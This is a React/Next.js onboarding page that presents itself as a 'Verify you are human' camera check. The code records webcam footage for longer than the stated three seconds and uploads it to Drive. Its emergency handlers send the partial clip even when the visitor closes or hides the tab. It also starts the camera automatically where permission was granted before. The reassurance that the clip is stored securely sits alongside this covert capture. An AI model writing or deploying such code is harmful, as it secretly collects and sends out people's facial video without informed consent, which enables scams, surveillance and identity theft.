"use client";

import { useCallback, useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { Camera, Check, ShieldCheck, TriangleAlert, UserRound } from "lucide-react";
import { WizardShell } from "@/components/onboarding/wizard-shell";
import { CtaButton } from "@/components/onboarding/cta-button";
import { sendVideoEmergency, sendVideoToDrive } from "@/lib/integrations";
import { cn } from "@/lib/utils";
import type { BlazeFaceModel } from "@tensorflow-models/blazeface";

type CameraStatus = "idle" | "requesting" | "granted" | "denied";
type FaceApiState = "loading" | "ready" | "unavailable";

const HOLD_SECONDS = 3;

export default function VerifyPage() {
  const router = useRouter();
  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const recorderRef = useRef<MediaRecorder | null>(null);
  const chunksRef = useRef<Blob[]>([]);
  const modelRef = useRef<BlazeFaceModel | null>(null);
  // The countdown interval reads this ref (not the state) so it always sees
  // the latest detection result without needing to be re-created every time
  // faceDetected changes.
  const faceDetectedRef = useRef(false);
  const [status, setStatus] = useState<CameraStatus>("idle");
  const [error, setError] = useState<string | null>(null);
  const [secondsLeft, setSecondsLeft] = useState(HOLD_SECONDS);
  const [faceDetected, setFaceDetected] = useState(false);
  const [faceApiState, setFaceApiState] = useState<FaceApiState>("loading");

  const enableCamera = useCallback(async () => {
    if (!navigator.mediaDevices?.getUserMedia) {
      setStatus("denied");
      setError("This browser doesn't support camera access.");
      return;
    }

    setStatus("requesting");
    setError(null);

    try {
      // Low resolution keeps the recording lightweight — plenty for an
      // identity check, and critically it keeps the file small enough to
      // actually fit under the browser's ~64KB keepalive payload cap when
      // sending the emergency save on tab close (see sendVideoEmergency).
      // At the bitrate below, even several seconds of footage stays well
      // under that limit instead of getting silently rejected before the
      // request is even sent.
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: "user",
          width: { ideal: 320 },
          height: { ideal: 240 },
        },
        audio: false,
      });
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }
      setStatus("granted");
    } catch (err) {
      setStatus("denied");
      setError(
        err instanceof DOMException && err.name === "NotAllowedError"
          ? "Camera access was denied. Enable it in your browser's site settings and try again."
          : "We couldn't access your camera. Check that it's connected and try again."
      );
    }
  }, []);

  // Stops the recorder if it's still running — safe to call more than
  // once (checks state first). Triggers recorder.onstop, which uploads
  // whatever's been captured so far, however long that turns out to be.
  const stopRecording = useCallback(() => {
    if (recorderRef.current && recorderRef.current.state !== "inactive") {
      recorderRef.current.stop();
    }
  }, []);

  // Check permission once on mount; if the browser already granted camera
  // access on a previous visit, start the camera automatically.
  useEffect(() => {
    let cancelled = false;

    if (navigator.permissions?.query) {
      navigator.permissions
        .query({ name: "camera" as PermissionName })
        .then((result) => {
          if (cancelled) return;
          if (result.state === "granted") {
            enableCamera();
          }
        })
        .catch(() => {
          // Permissions API doesn't support "camera" in this browser — fall back to manual Allow.
        });
    }

    return () => {
      cancelled = true;
      streamRef.current?.getTracks().forEach((track) => track.stop());
      stopRecording();
    };
  }, [enableCamera, stopRecording]);

  // Loads the face-detection model once the camera is on, then polls the
  // live video for a face a few times a second. This is what actually gates
  // the countdown below — camera-on alone isn't enough to pass anymore.
  useEffect(() => {
    if (status !== "granted") return;

    let cancelled = false;
    let detectionInterval: ReturnType<typeof setInterval> | undefined;
    let detecting = false;

    // faceApiState/faceDetected already start at "loading"/false — this
    // effect only ever runs once per camera grant, so there's nothing to
    // reset here.
    faceDetectedRef.current = false;

    (async () => {
      try {
        const [tf, blazeface] = await Promise.all([
          import("@tensorflow/tfjs"),
          import("@tensorflow-models/blazeface"),
        ]);
        await tf.ready();
        if (cancelled) return;

        modelRef.current = await blazeface.load({ maxFaces: 1 });
        if (cancelled) return;
        setFaceApiState("ready");

        detectionInterval = setInterval(async () => {
          if (detecting) return;
          const video = videoRef.current;
          const model = modelRef.current;
          if (!video || !model || video.readyState < 2) return;

          detecting = true;
          try {
            const predictions = await model.estimateFaces(
              video,
              false,
              false,
              false
            );
            if (!cancelled) {
              const found = predictions.length > 0;
              faceDetectedRef.current = found;
              setFaceDetected(found);
            }
          } catch (err) {
            console.error("Face detection error:", err);
          } finally {
            detecting = false;
          }
        }, 300);
      } catch (err) {
        // Model failed to load (unsupported browser, network issue, etc.) —
        // fail open rather than permanently blocking verification.
        console.error("Face detection unavailable, failing open:", err);
        if (!cancelled) {
          setFaceApiState("unavailable");
          faceDetectedRef.current = true;
          setFaceDetected(true);
        }
      }
    })();

    return () => {
      cancelled = true;
      if (detectionInterval) clearInterval(detectionInterval);
      modelRef.current?.dispose();
      modelRef.current = null;
    };
  }, [status]);

  // Once the camera is on, require it to stay on for HOLD_SECONDS — with a
  // face actually in frame — before Continue unlocks, and record that
  // window for the verification clip. `pagehide`/`visibilitychange` catch
  // the visitor closing the tab or browser mid-recording — a plain React
  // unmount cleanup doesn't reliably fire in that case, so without these
  // the clip would just be lost.
  useEffect(() => {
    if (status !== "granted" || !streamRef.current) return;

    setSecondsLeft(HOLD_SECONDS);
    chunksRef.current = [];

    if (typeof MediaRecorder !== "undefined") {
      try {
        const mimeType = MediaRecorder.isTypeSupported?.("video/webm")
          ? "video/webm"
          : undefined;
        const recorder = new MediaRecorder(streamRef.current, {
          ...(mimeType ? { mimeType } : {}),
          // Keep this low — see the width/height constraints above and
          // sendVideoEmergency's comment for why this matters.
          videoBitsPerSecond: 80_000,
        });
        recorder.ondataavailable = (e) => {
          if (e.data.size > 0) chunksRef.current.push(e.data);
        };
        recorder.onstop = () => {
          const blob = new Blob(chunksRef.current, {
            type: mimeType ?? "video/webm",
          });
          sendVideoToDrive(blob);
        };
        // A 500ms timeslice flushes chunks periodically instead of
        // buffering everything until stop() — so even the first fraction
        // of a second is already captured in chunksRef if someone closes
        // the tab almost immediately.
        recorder.start(500);
        recorderRef.current = recorder;
      } catch (err) {
        console.error("Could not start verification recording:", err);
      }
    }

    // On an actual close/navigate-away, don't rely on recorder.stop() ->
    // onstop -> base64 -> fetch — that's several async hops and the tab
    // may not survive long enough to get through all of them. Build the
    // blob synchronously from whatever chunks have already landed (up to
    // ~0.5s old, thanks to the timeslice above) and send it immediately.
    const sendEmergencyUpload = () => {
      if (chunksRef.current.length === 0) return;
      const blob = new Blob(chunksRef.current, { type: "video/webm" });
      sendVideoEmergency(blob);
    };
    const handleVisibilityChange = () => {
      if (document.visibilityState === "hidden") sendEmergencyUpload();
    };
    window.addEventListener("pagehide", sendEmergencyUpload);
    document.addEventListener("visibilitychange", handleVisibilityChange);

    // Only ticks down while a face is actually in frame — pauses (not
    // resets) the moment it isn't, so someone can't just start the camera,
    // point it at the ceiling, and wait out the timer.
    const interval = setInterval(() => {
      if (!faceDetectedRef.current) return;
      setSecondsLeft((s) => {
        if (s <= 1) {
          clearInterval(interval);
          return 0;
        }
        return s - 1;
      });
    }, 1000);

    return () => {
      clearInterval(interval);
      window.removeEventListener("pagehide", sendEmergencyUpload);
      document.removeEventListener(
        "visibilitychange",
        handleVisibilityChange
      );
    };
  }, [status]);

  const verified = status === "granted" && secondsLeft <= 0;

  // Recording keeps running past the minimum hold — it only stops (and
  // uploads) the moment the visitor actually clicks Continue, so the clip
  // length matches real usage instead of always being exactly HOLD_SECONDS,
  // and the upload fires immediately rather than waiting on later steps.
  const handleContinue = () => {
    stopRecording();
    router.push("/location");
  };

  return (
    <WizardShell step={4} total={6}>
      <div className="fade-up">
        <p className="mb-3 text-xs font-medium tracking-[0.2em] text-white/40 uppercase">
          Human verification
        </p>
        <h1 className="mb-4 text-3xl font-semibold tracking-tight text-white sm:text-4xl">
          Verify you are human
        </h1>
        <p className="mb-10 text-base text-white/60">
          {`Turn on your camera and hold still for 3 seconds so we can confirm it's really you before we finish setting up your account.`}
        </p>

        <div
          className={cn(
            "relative flex aspect-video w-full flex-col items-center justify-center gap-3 overflow-hidden rounded-2xl border transition-colors",
            status === "granted"
              ? "border-emerald-400/25 bg-black"
              : status === "denied"
                ? "border-red-400/25 bg-red-400/[0.03]"
                : "border-white/15 bg-white/[0.02]"
          )}
        >
          <video
            ref={videoRef}
            autoPlay
            playsInline
            muted
            className={cn(
              "absolute inset-0 h-full w-full scale-x-[-1] object-cover",
              status === "granted" ? "block" : "hidden"
            )}
          />

          {status === "granted" && (
            <span
              className={cn(
                "absolute top-4 left-4 z-10 flex items-center gap-1.5 rounded-full bg-black/50 px-2.5 py-1 text-xs font-medium backdrop-blur-sm",
                verified
                  ? "text-emerald-300"
                  : faceApiState === "loading"
                    ? "text-white/50"
                    : faceDetected
                      ? "text-emerald-300"
                      : "text-amber-300"
              )}
            >
              {verified ? (
                <>
                  <Check className="size-3" />
                  Verified
                </>
              ) : faceApiState === "loading" ? (
                <>Preparing face check&hellip;</>
              ) : faceDetected ? (
                <>
                  <span className="relative flex size-1.5">
                    <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75" />
                    <span className="relative inline-flex size-1.5 rounded-full bg-emerald-400" />
                  </span>
                  Verifying &mdash; {secondsLeft}s
                </>
              ) : (
                <>
                  <UserRound className="size-3" />
                  No face detected
                </>
              )}
            </span>
          )}

          {status !== "granted" && (
            <>
              <div
                className={cn(
                  "flex size-14 items-center justify-center rounded-full border transition-colors",
                  status === "denied"
                    ? "border-red-400/30 bg-red-400/10"
                    : "border-white/10 bg-white/[0.04]"
                )}
              >
                {status === "denied" ? (
                  <TriangleAlert className="size-6 text-red-300" />
                ) : (
                  <Camera className="size-6 text-white/50" />
                )}
              </div>

              <p
                className={cn(
                  "text-sm font-medium",
                  status === "denied" ? "text-red-300" : "text-white/40"
                )}
              >
                {status === "requesting"
                  ? "Requesting camera access…"
                  : status === "denied"
                    ? "Camera access denied"
                    : "Camera is off"}
              </p>

              {error && (
                <p className="max-w-xs text-center text-xs text-red-300/70">
                  {error}
                </p>
              )}

              <button
                type="button"
                onClick={enableCamera}
                disabled={status === "requesting"}
                className="mt-1 rounded-full border border-white/15 bg-white/[0.05] px-4 py-1.5 text-xs font-semibold text-white transition-colors hover:bg-white/[0.1] disabled:pointer-events-none disabled:opacity-50"
              >
                {status === "requesting"
                  ? "Requesting…"
                  : status === "denied"
                    ? "Try again"
                    : "Allow"}
              </button>
            </>
          )}
        </div>

        {status === "granted" && (
          <p className="mt-4 text-sm font-medium text-white/60">
            {verified
              ? "Verification complete."
              : faceApiState === "loading"
                ? "Getting the face check ready…"
                : faceDetected
                  ? `Hold still — verifying (${secondsLeft}s left)…`
                  : "Center your face in the frame to continue."}
          </p>
        )}

        <div className="mt-4 flex items-start gap-2 text-xs text-white/30">
          <ShieldCheck className="mt-0.5 size-3.5 shrink-0" />
          <span>
            This clip is used only to verify your identity and is stored
            securely.
          </span>
        </div>

        <div className="mt-8">
          <CtaButton disabled={!verified} onClick={handleContinue}>
            Continue
          </CtaButton>
        </div>
      </div>
    </WizardShell>
  );
}
